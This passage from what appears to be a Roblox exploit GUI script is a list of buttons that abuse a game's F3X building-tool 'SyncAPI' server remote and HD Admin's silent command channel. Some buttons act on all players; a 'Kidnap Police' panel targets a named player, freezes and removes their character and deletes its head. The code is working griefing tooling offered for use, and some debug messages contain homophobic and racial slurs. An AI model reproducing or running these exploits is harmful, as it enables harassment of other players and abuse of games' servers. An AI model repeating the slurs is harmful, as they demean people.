        }
    }
    _(args)
end

function destroy(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

local function makemesh(part)
    local args = {
        "CreateMeshes",
        {
            {
                Part = part
            }
        }
    }
    _(args)
end

local function syncmeshsize(part, vectora)
    local args = {
        "SyncMesh",
        {
            {
                Part = part,
                Scale = vectora
            }
        }
    }
    _(args)
end

local function syncmeshtexture(part, id)
    local args = {
        "SyncMesh",
        {
            {
                Part = part,
                TextureId = "rbxassetid://" .. id
            }
        }
    }
    _(args)
end

local function name(part, stringa)
    local args = {
        "SetName",
        { part },
        stringa
    }
    _(args)
end

local function lock(part, boolean)
    local args = {
        "SetLocked",
        { part },
        boolean
    }
    _(args)
end

local function setcollision(part, booleana)
    local args = {
        "SyncCollision",
        {
            {
                Part = part,
                CanCollide = booleana
            }
        }
    }
    _(args)
end

local function setanchor(part, boolean)
    local args = {
        "SyncAnchor",
        {
            {
                Part = part,
                Anchored = boolean
            }
        }
    }
    _(args)
end

local function createdecal(part, side)
    local args = {
        "CreateTextures",
        {
            {
                Part = part,
                Face = side,
                TextureType = "Decal"
            }
        }
    }
    _(args)
end

local function setdecal(part, asset, side)
    local args = {
        "SyncTexture",
        {
            {
                Part = part,
                Face = side,
                TextureType = "Decal",
                Texture = "rbxassetid://" .. asset
            }
        }
    }
    _(args)
end

-- ===== LIGHTING SYSTEM =====
local function addlight(part)
    local args = {
        [1] = "CreateLights",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["LightType"] = "PointLight"
            }
        }
    }
    serverendpoint:InvokeServer(unpack(args))
end

local function synclight(part, brightness, range)
    local args = {
        [1] = "SyncLighting",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["LightType"] = "PointLight",
                ["Brightness"] = brightness,
                ["Range"] = range,
                ["Color"] = Color3.new(0.35, 0, 0)
            }
        }
    }
    serverendpoint:InvokeServer(unpack(args))
end

-- Apply lights to all existing parts
for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        task.spawn(function()
            addlight(v)
            synclight(v, 0.2, 35)
        end)
    end
end

-- Apply lights to new parts as they're added
descendantConnection = workspace.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("BasePart") or descendant:IsA("UnionOperation") then
        task.wait(0.5) -- Wait a bit for the part to be fully loaded
        task.spawn(function()
            addlight(descendant)
            synclight(descendant, 0.2, 35)
        end)
    end
end)
-- ===== END LIGHTING SYSTEM =====

-- Trail spawning loop - KEEP THIS WORKING!
while task.wait(0.1) do
    if not scriptActive then break end -- Only break if script is disabled
    
    spawn(function()
        -- Check if character still exists and has HRP
        if not char or not char.Parent or not char:FindFirstChild("HumanoidRootPart") then
            return
        end
        
        local hrp = char.HumanoidRootPart
        local pos = hrp.CFrame * CFrame.new(0, -3.2, 0)
        local trail = serverendpoint:InvokeServer("CreatePart", "Normal", pos, char)

        setcollision(trail, false)
        syncmaterial(trail, Enum.Material.Granite)
        color(trail, Color3.new(0, 0, 0))
        resize(trail, Vector3.new(10, 0.5, 10), trail.CFrame)
        fire(trail)

        -- Add light to the trail too
        addlight(trail)
        synclight(trail, 5, 20)

        task.wait(1)
        delete(trail)
    end)
end
    end
})
AddButton({
    Name = "Rc7 Cloud Me",
    Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--// Script: RC7 Cloud F3X \\ --
--// Creator: ItsKittyyyGD \\ --
-- CODE/SOURCE (OPEN):

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
    local args = {"SyncCollision", {{Part = part, CanCollide = boolean}}}
    _(args)
end

function SetAnchor(boolean, part)
    local args = {"SyncAnchor", {{Part = part, Anchored = boolean}}}
    _(args)
end

function CreatePart(cf, parent)
    local args = {"CreatePart", "Normal", cf, parent}
    _(args)
end

function AddMesh(part)
    local args = {"CreateMeshes", {{Part = part}}}
    _(args)
end

function SetMesh(part, meshid)
    local args = {"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}}
    _(args)
end

function MeshResize(part, size)
    local args = {"SyncMesh", {{Part = part, Scale = size}}}
    _(args)
end

function SetColor(part, color)
    local args = {"SyncColor", {{Part = part, Color = color, UnionColoring = false}}}
    _(args)
end

function MovePart(part, cf)
    local args = {"SyncMove", {{Part = part, CFrame = cf}}}
    _(args)
end

function CreateCloud()
    local head = char:WaitForChild("Head")
    local cf = head.CFrame + Vector3.new(0, 6, 0)
    CreatePart(cf, workspace)
    task.spawn(function()
        repeat task.wait() until (function()
            for _, v in workspace:GetDescendants() do
                if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 0.5 then
                    SetAnchor(true, v)
                    SetCollision(v, false)
                    SetColor(v, BrickColor.new(333).Color)
                    AddMesh(v)
                    SetMesh(v, "111820358")
                    MeshResize(v, Vector3.new(8, 8, 8))
                    task.spawn(function()
                        game:GetService("RunService").RenderStepped:Connect(function()
                            if char and char:FindFirstChild("Head") then
                                MovePart(v, char.Head.CFrame + Vector3.new(0, 6, 0))
                            end
                        end)
                    end)
                    return true
                end
            end
        end)()
    end)
end

CreateCloud()

-- i can quit because theres more scripters f3x better than me. This can be my last script but,who knows?
end
})
AddButton({
    Name = "Rc7 Cloud All",
    Callback = function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Find SyncAPI tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

local function invoke(args)
    remote:InvokeServer(unpack(args))
end

local function SetCollision(part, boolean)
    invoke({"SyncCollision", {{Part = part, CanCollide = boolean}}})
end

local function SetAnchor(boolean, part)
    invoke({"SyncAnchor", {{Part = part, Anchored = boolean}}})
end

local function CreatePart(cf, parent)
    invoke({"CreatePart", "Normal", cf, parent})
end

local function AddMesh(part)
    invoke({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    invoke({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function MeshResize(part, size)
    invoke({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetColor(part, color)
    invoke({"SyncColor", {{Part = part, Color = color, UnionColoring = false}}})
end

local function MovePart(part, cf)
    invoke({"SyncMove", {{Part = part, CFrame = cf}}})
end

-- Cloud creation function for any character
local function CreateCloudForChar(character)
    if not character:FindFirstChild("Head") then return end
    local head = character.Head
    local cf = head.CFrame + Vector3.new(0, 6, 0)
    CreatePart(cf, workspace)

    task.spawn(function()
        repeat task.wait() until (function()
            for _, v in workspace:GetDescendants() do
                if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 0.5 then
                    SetAnchor(true, v)
                    SetCollision(v, false)
                    SetColor(v, BrickColor.new(333).Color)
                    AddMesh(v)
                    SetMesh(v, "111820358")
                    MeshResize(v, Vector3.new(8, 8, 8))
                    task.spawn(function()
                        RunService.RenderStepped:Connect(function()
                            if character and character:FindFirstChild("Head") then
                                MovePart(v, character.Head.CFrame + Vector3.new(0, 6, 0))
                            end
                        end)
                    end)
                    return true
                end
            end
        end)()
    end)
end

-- Apply cloud to all existing players
for _, p in ipairs(Players:GetPlayers()) do
    if p.Character then
        CreateCloudForChar(p.Character)
    end
end

-- Apply cloud to players as they spawn
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function(c)
        CreateCloudForChar(c)
    end)
end)
end
})
AddButton({
    Name = "Headshake",
    Callback = function()

local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()



-- find shit

local tool

for _, v in player:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

        break

    end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

        break

    end

end

if not tool then

    warn(" SyncAPI Tool!")

    return

end



local remote = tool.SyncAPI.ServerEndpoint





local head = char:FindFirstChild("Head")

if not head then

    warn("fuck fagz")

    return

end

local headMesh = head:FindFirstChildWhichIsA("SpecialMesh")

if not headMesh then

    warn("nigga")

    return

end





local hats = {}

for _, hat in pairs(char:GetChildren()) do

    if hat:IsA("Accessory") and hat:FindFirstChild("Handle") then

        local handleMesh = hat.Handle:FindFirstChildWhichIsA("SpecialMesh")

        if handleMesh then

            table.insert(hats, {Part = hat.Handle, MeshId = handleMesh.MeshId})

        end

    end

end





local amplitude = 1

local frequency = 2 

local t = 0



local RunService = game:GetService("RunService")

RunService.RenderStepped:Connect(function(dt)

    t = t + dt * frequency

    local offsetValue = math.sin(t) * amplitude



    

    local partsToSync = {

        {Part = head, MeshId = headMesh.MeshId, Offset = Vector3.new(offsetValue, 0, 0)}

    }

    for _, h in pairs(hats) do

        table.insert(partsToSync, {Part = h.Part, MeshId = h.MeshId, Offset = Vector3.new(offsetValue, 0, 0)})

    end



    remote:InvokeServer("SyncMesh", partsToSync)

end)
    end
})
AddButton({
    Name = "Headshake All",
    Callback = function()
        local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Configuration
local amplitude = 1
local frequency = 2
local t = 0

-- Helper: Find SyncAPI tool for a player
local function getSyncTool(player)
    for _, v in player:GetDescendants() do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    return nil
end

-- Helper: Get head and hat meshes for a character
local function getPartsToSync(char)
    local head = char:FindFirstChild("Head")
    if not head then return nil end
    local headMesh = head:FindFirstChildWhichIsA("SpecialMesh")
    if not headMesh then return nil end

    local hats = {}
    for _, hat in pairs(char:GetChildren()) do
        if hat:IsA("Accessory") and hat:FindFirstChild("Handle") then
            local handleMesh = hat.Handle:FindFirstChildWhichIsA("SpecialMesh")
            if handleMesh then
                table.insert(hats, {Part = hat.Handle, MeshId = handleMesh.MeshId})
            end
        end
    end

    local parts = {{Part = head, MeshId = headMesh.MeshId}}
    for _, h in pairs(hats) do
        table.insert(parts, {Part = h.Part, MeshId = h.MeshId})
    end
    return parts
end

-- Table to store player data
local playerData = {}

-- Function to initialize a player
local function initPlayer(player)
    if player == LocalPlayer then return end -- skip yourself if needed
    local char = player.Character or player.CharacterAdded:Wait()
    local tool = getSyncTool(player)
    if tool then
        local parts = getPartsToSync(char)
        if parts then
            playerData[player] = {Tool = tool, Parts = parts}
        end
    end
end

-- Initialize existing players
for _, player in pairs(Players:GetPlayers()) do
    initPlayer(player)
end

-- Listen for new players joining
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        initPlayer(player)
    end)
end)

-- Listen for characters respawning
Players.PlayerRemoving:Connect(function(player)
    playerData[player] = nil
end)

-- Main sway loop
RunService.RenderStepped:Connect(function(dt)
    t = t + dt * frequency
    local offsetValue = math.sin(t) * amplitude

    for player, data in pairs(playerData) do
        local partsToSync = {}
        for _, p in pairs(data.Parts) do
            table.insert(partsToSync, {Part = p.Part, MeshId = p.MeshId, Offset = Vector3.new(offsetValue, 0, 0)})
        end
        if data.Tool and data.Tool:FindFirstChild("SyncAPI") then
            local remote = data.Tool.SyncAPI:FindFirstChild("ServerEndpoint")
            if remote then
                remote:InvokeServer("SyncMesh", partsToSync)
            end
        end
    end
end)
end
})
AddButton({
    Name = "Chicken Arms",
    Callback = function()
        local RunService = game:GetService("RunService")    local Players = game:GetService("Players")

     

    local lp = Players.LocalPlayer

    local char = lp.Character or lp.CharacterAdded:Wait()

    local hum = char:WaitForChild("Humanoid")

    local torso = char:WaitForChild("Torso")

local tool = char:FindFirstChildOfClass("Tool")

    if not tool then        for _, v in lp.Backpack:GetChildren() do

            if v:IsA("Tool") then

                tool = v

                break

            end

        end

    end

     

    if tool then

        hum:EquipTool(tool)

        task.delay(0.01, function()

            hum:UnequipTools()

        end)

    end

     

    local server = tool and tool:FindFirstChild("SyncAPI") and tool.SyncAPI:FindFirstChild("ServerEndpoint")

local larm = char:WaitForChild("Left Arm")

    local rarm = char:WaitForChild("Right Arm")     

    local idleAngles = Vector3.new(0,0,math.rad(-90))

    local flapAmplitude = Vector3.new(0, 0, math.rad(30))

    local flapSpeed = 25

     

    local targetL, targetR = larm.CFrame, rarm.CFrame

RunService.RenderStepped:Connect(function(delta)

        if not larm or not rarm then return end        local time = tick()

        local flapX = math.sin(time * flapSpeed) * flapAmplitude.X

        local flapY = math.sin(time * flapSpeed * 0.8) * flapAmplitude.Y

        local flapZ = math.sin(time * flapSpeed * 0.6) * flapAmplitude.Z

     

        if hum.MoveDirection.Magnitude == 0 then  

            targetL = torso.CFrame * CFrame.new(-1.9,0.5,0) * CFrame.Angles(idleAngles.X, idleAngles.Y, idleAngles.Z)  

            targetR = torso.CFrame * CFrame.new(1.9,0.5,0) * CFrame.Angles(-idleAngles.X, -idleAngles.Y, -idleAngles.Z)  

        else  

            targetL = torso.CFrame * CFrame.new(-1.9,0.5,0) * CFrame.Angles(flapX, flapY, idleAngles.Z + flapZ)  

            targetR = torso.CFrame * CFrame.new(1.9,0.5,0) * CFrame.Angles(-flapX, -flapY, -idleAngles.Z - flapZ)  

        end  

     

        larm.CFrame = targetL  

        rarm.CFrame = targetR

    end)

    

    if server then

        spawn(function()

            while true do

                if larm and rarm then

                    server:InvokeServer("SyncMove", {{Part = larm, CFrame = larm.CFrame}})

                    server:InvokeServer("SyncMove", {{Part = rarm, CFrame = rarm.CFrame}})

                end

                task.wait()

            end

        end)

    end
    end
})
AddButton({
    Name = "Floating Pad By 1x9",
    Callback = function()
        local player = game.Players.LocalPlayer
	
	local char = player.Character
	
	local tool
	
	
	
	for i,v in player:GetDescendants() do
	
		if v.Name == "SyncAPI" then
	
			tool = v.Parent
	
			break
	
		end
	
	end
	
	for i,v in game.ReplicatedStorage:GetDescendants() do
	
		if v.Name == "SyncAPI" then
	
			tool = v.Parent
	
			break
	
		end
	
	end
	
	
	
	if not tool then return end
	
	
	
	local remote = tool.SyncAPI.ServerEndpoint
	
	function _(args)
	
		remote:InvokeServer(unpack(args))
	
	end
	
	
	
	function CreatePart(cf,parent,types)
	
		local args = {[1]="CreatePart",[2]=types or "Normal",[3]=cf,[4]=parent}
	
		_(args)
	
	end
	
	
	
	function Resize(part,size,cf)
	
		local args = {[1]="SyncResize",[2]={[1]={["Part"]=part,["CFrame"]=cf,["Size"]=size}}}
	
		_(args)
	
	end
	
	
	
	function MovePart(part,cf)
	
		local args = {[1]="SyncMove",[2]={[1]={["Part"]=part,["CFrame"]=cf}}}
	
		_(args)
	
	end
	
	function Color(part,color)
	
		local args = {[1]="SyncColor",[2]={[1]={["Part"]=part,["Color"]=color,["UnionColoring"]=false}}}
	
		_(args)
	
	end
	
	
	
	function SetShape(part,shape)
	
		local args = {[1]="SyncMaterial",[2]={[1]={["Part"]=part,["Shape"]=shape}}}
	
		_(args)
	
	end
	
	
	
	function SetCollision(part,boolean)
	
		local args = {[1]="SyncCollision",[2]={[1]={["Part"]=part,["CanCollide"]=boolean}}}
	
		_(args)
	
	end
	
	
	
	function SetLocked(part,boolean)
	
		local args = {[1]="SetLocked",[2]={[1]=part},[3]=boolean}
	
		_(args)
	
	end
	
	local padPos = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
	
	CreatePart(padPos, workspace, "Cylinder")
	
	wait(0.1)
	
	
	
	local floatingPad
	
	for i,v in game.Workspace:GetChildren() do
	
		if v:IsA("BasePart") and (v.CFrame.Position - padPos.Position).Magnitude < 5 and not v.Parent:FindFirstChild("Humanoid") then
	
			floatingPad = v
	
			Resize(floatingPad, Vector3.new(0.5, 6, 6), padPos * CFrame.Angles(0, 0, math.rad(90)))
	
			Color(floatingPad, Color3.fromRGB(128, 0, 128))
	
			SetCollision(floatingPad, true)
	
			SetLocked(floatingPad, true)
	
			break
	
		end
	
	end
	
	if floatingPad then
	
		local RunService = game:GetService("RunService")
	
	
	
		RunService.Heartbeat:Connect(function(dt)
	
			pcall(function()
	
				if char and char:FindFirstChild("HumanoidRootPart") then
	
					local targetPos = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
	
					MovePart(floatingPad, targetPos * CFrame.Angles(0, 0, math.rad(90)))
	
				end
	
			end)
	
		end)
	
	end
    end
})
AddButton({
    Name = "Kidnap Police Gui",
    Callback = function()
        -- [ Kidnapper Police By ItsKittyyyGD ]] --
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end


local function light(part,color)


	local createArgs = {
		"CreateLights",
		{
			{
				Part = part,
				LightType = "PointLight"
			}
		}
	}


	local syncArgs = {
		"SyncLighting",
		{
			{
				Part = part,
				LightType = "PointLight",
				Color = color,
        Brightness = 30,
				Range = 20,
			}
		}
	}

	_(createArgs)
	_(syncArgs)
end


local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local gui = Instance.new("ScreenGui")
gui.Name = "KidNappers Suite"
gui.ResetOnSpawn = false
gui.Parent = CoreGui

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 300, 0, 200)
Main.Position = UDim2.new(0.3, 0, 0.3, 0)
Main.BackgroundColor3 = Color3.new(0, 0, 0)
Main.BorderSizePixel = 0
Main.Active = true
Main.Parent = gui

local Outline = Instance.new("UIStroke")
Outline.Color = Color3.new(1, 0, 0)
Outline.Thickness = 2
Outline.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.Creepster
Title.Text = "KidNappers Suite"
Title.TextSize = 28
Title.TextColor3 = Color3.new(1, 0, 0)
Title.Parent = Main

local InputContainer = Instance.new("Frame")
InputContainer.Size = UDim2.new(0, 280, 0, 40)
InputContainer.Position = UDim2.new(0.5, -160, 0.5, -20)
InputContainer.AnchorPoint = Vector2.new(0.5, 0.5)
InputContainer.BackgroundTransparency = 1
InputContainer.Parent = Main

local BoxHolder = Instance.new("Frame")
BoxHolder.Size = UDim2.new(0.75, 0, 1, 0)
BoxHolder.Position = UDim2.new(0, 0, 0, 0)
BoxHolder.BackgroundColor3 = Color3.new(0, 0, 0)
BoxHolder.BorderSizePixel = 0
BoxHolder.Parent = InputContainer

local BoxOutline = Instance.new("UIStroke")
BoxOutline.Thickness = 2
BoxOutline.Color = Color3.new(1, 0, 0)
BoxOutline.Parent = BoxHolder

local UsernameBox = Instance.new("TextBox")
UsernameBox.Size = UDim2.new(1, -10, 1, -10)
UsernameBox.Position = UDim2.new(0, 5, 0, 5)
UsernameBox.BackgroundColor3 = Color3.new(0, 0, 0)
UsernameBox.BorderSizePixel = 0
UsernameBox.PlaceholderText = "Enter here sum username or idk"
UsernameBox.Text = ""
UsernameBox.TextColor3 = Color3.new(1, 0, 0)
UsernameBox.PlaceholderColor3 = Color3.new(0.5, 0, 0)
UsernameBox.Font = Enum.Font.Creepster
UsernameBox.TextSize = 18
UsernameBox.ClearTextOnFocus = false
UsernameBox.Parent = BoxHolder

local CheckButton = Instance.new("TextButton")
CheckButton.Size = UDim2.new(0.23, 0, 1, 0)
CheckButton.Position = UDim2.new(0.77, 0, 0, 0)
CheckButton.BackgroundColor3 = Color3.new(0, 0, 0)
CheckButton.Font = Enum.Font.Creepster
CheckButton.Text = ""
CheckButton.TextScaled = true
CheckButton.TextColor3 = Color3.new(1, 0, 0)
CheckButton.AutoButtonColor = false
CheckButton.Parent = InputContainer

local BtnOutline = Instance.new("UIStroke")
BtnOutline.Thickness = 2
BtnOutline.Color = Color3.new(1, 0, 0)
BtnOutline.Parent = CheckButton

local MadeBy = Instance.new("TextLabel")
MadeBy.Size = UDim2.new(1, 0, 0, 20)
MadeBy.Position = UDim2.new(0, 0, 1, -25)
MadeBy.BackgroundTransparency = 1
MadeBy.TextColor3 = Color3.new(1, 0, 0)
MadeBy.Text = "Made By ItsKittyyyGD"
MadeBy.Font = Enum.Font.Creepster
MadeBy.TextSize = 16
MadeBy.Parent = Main

local function normalize(str)
    return (str or ""):lower():gsub("^%s*(.-)%s*$", "%1")
end

local function findPlayer(name)
    local target = normalize(name)
    for _, plr in pairs(Players:GetPlayers()) do
        if normalize(plr.Name) == target or (plr.DisplayName and normalize(plr.DisplayName) == target) then
            return plr
        end
    end
    return nil
end

local function findSyncAPI()
    local LocalPlayer = Players.LocalPlayer
    for _, v in pairs(LocalPlayer.Backpack:GetDescendants()) do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    for _, v in pairs((LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):GetDescendants()) do
        if v.Name == "SyncAPI" then
            return v.Parent
        end
    end
    return nil
end

local colorOptions = {
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 0, 0)
}


local function invokeSync(remote, args)
    pcall(function()
        remote:InvokeServer(unpack(args))
    end)
end

local function easeInOutSine(t)
    return -(math.cos(math.pi * t) - 1) / 2
end

local function main(victimPlayer)
    local tool = findSyncAPI()
    if not tool then return end
    local remote = tool.SyncAPI.ServerEndpoint
    local char = victimPlayer.Character or victimPlayer.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local meshId = "6094994741"
    local textureId = "6094994830"
    local meshScale = Vector3.new(0.4, 0.4, 0.4)
    local partSize = Vector3.new(4, 4, 4)
    local startOffset = -50
    local centerOffset = 0
    local endOffset = 50
    local function getRotatedDirection()
        local fwd = hrp.CFrame.LookVector
        return (CFrame.Angles(0, math.rad(85), 0) * fwd).Unit
    end
    local function getOffsetCFrame(offset)
        local dir = getRotatedDirection()
        local basePos = hrp.Position + hrp.CFrame.LookVector * 8 + Vector3.new(0, 0.5, 0)
        local pos = basePos + dir * offset
        return CFrame.new(pos, pos + dir)
    end
    local function SyncResize(part, size, cf)
        invokeSync(remote, {"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
    end
    local function SyncAnchor(part, anchored)
        invokeSync(remote, {"SyncAnchor", {{Part = part, Anchored = anchored}}})
    end
    local function SyncCollision(part, canCollide)
        invokeSync(remote, {"SyncCollision", {{Part = part, CanCollide = canCollide}}})
    end
    local function SetLocked(part, locked)
        invokeSync(remote, {"SetLocked", {part}, locked})
    end
    local function CreateMeshes(part)
        invokeSync(remote, {"CreateMeshes", {{Part = part}}})
    end
    local function SyncMeshID(part, meshid)
        invokeSync(remote, {"SyncMesh", {{Part = part, MeshId = "rbxassetid://"..meshid}}})
    end
    local function SyncMeshTexture(part, textureid)
        invokeSync(remote, {"SyncMesh", {{Part = part, TextureId = "rbxassetid://"..textureid}}})
    end
    local function SyncMeshScale(part, scale)
        invokeSync(remote, {"SyncMesh", {{Part = part, Scale = scale}}})
    end
    local function CreatePart(cf, parent)
        local succ, res = pcall(function()
            return remote:InvokeServer("CreatePart", "Normal", cf, parent)
        end)
        if succ and res and res:IsA("BasePart") then
            return res
        end
        return nil
    end
    local function movePartSmooth(part, fromOffset, toOffset)
        local startCF = getOffsetCFrame(fromOffset)
        local endCF = getOffsetCFrame(toOffset)
        local distance = (startCF.Position - endCF.Position).Magnitude
        local speed = 10
        local duration = math.clamp(distance / speed, 0.5, 5)
        local startTime = tick()
        repeat
            local now = tick()
            local alpha = math.clamp((now - startTime) / duration, 0, 1)
            local eased = easeInOutSine(alpha)
            local cf = startCF:Lerp(endCF, eased)
            SyncResize(part, partSize, cf)
            RunService.Heartbeat:Wait()
        until alpha >= 1
    end
    local function freezeCharacter()
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                SyncAnchor(part, true)
                SyncCollision(part, false)
            end
        end
    end
    local function unlockAndDestroyHead()
        local head = char:FindFirstChild("Head")
        if head and head:IsA("BasePart") then
            SetLocked(head, false)
            task.wait(0.1)
            invokeSync(remote, {"Remove", {head}})
        end
    end
    freezeCharacter()
    local spawnCF = getOffsetCFrame(startOffset)
    local carPart = CreatePart(spawnCF, workspace)
    if not carPart then return end
spawn(function()
while true do
local currentColor = colorOptions[math.random(1, #colorOptions)]
spawn(function()
light(carPart, currentColor)
     end)
wait(0.01)
  end
end)
    SyncResize(carPart, partSize, spawnCF)
    SetLocked(carPart, true)
    SyncCollision(carPart, true)
    CreateMeshes(carPart)
    task.wait(0.1)
    SyncMeshID(carPart, meshId)
    task.wait(0.1)
    SyncMeshTexture(carPart, textureId)
    task.wait(0.1)
    SyncMeshScale(carPart, meshScale)
    task.wait(0.2)
    movePartSmooth(carPart, startOffset, centerOffset)
    task.wait(2)
    invokeSync(remote, {"Remove", {char}})
    movePartSmooth(carPart, centerOffset, endOffset)
    task.wait(0.3)
    unlockAndDestroyHead()
    task.wait(3)
    invokeSync(remote, {"Remove", {carPart}})

    
end

CheckButton.MouseButton1Click:Connect(function()
    local input = UsernameBox.Text or ""
    local victim = findPlayer(input)
    if victim then
        task.spawn(main, victim)
    end
end)

local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
    if not dragging then return end
    local delta = input.Position - dragStart
    Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
    end
})
AddButton({
    Name = "ToadRoast",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

-- Set ambient music and atmosphere
SilentRequest:InvokeServer(";music 79999206651848")
SilentRequest:InvokeServer(";pitch .22")
SilentRequest:InvokeServer(";volume inf")

-- Rain Toad F3X (Better) Script By ItsKittyyyGD

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    _(args)
end

function SetAnchor(boolean, part)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function CreatePart(cf, parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end

function Resize(part, size, cf)
    local args = {
        [1] = "SyncResize",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf,
                ["Size"] = size
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = "rbxassetid://" .. texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

-- Added SetVertexColor function
function SetVertexColor(part, color)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["VertexColor"] = color
            }
        }
    }
    _(args)
end

function SetName(part, stringg)
    local args = {
        [1] = "SetName",
        [2] = {
            [1] = workspace.Part
        },
        [3] = stringg
    }
    _(args)
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(true, v)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4)) -- Added VertexColor
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

local function createRainToads()
    while true do
        wait(0.3)
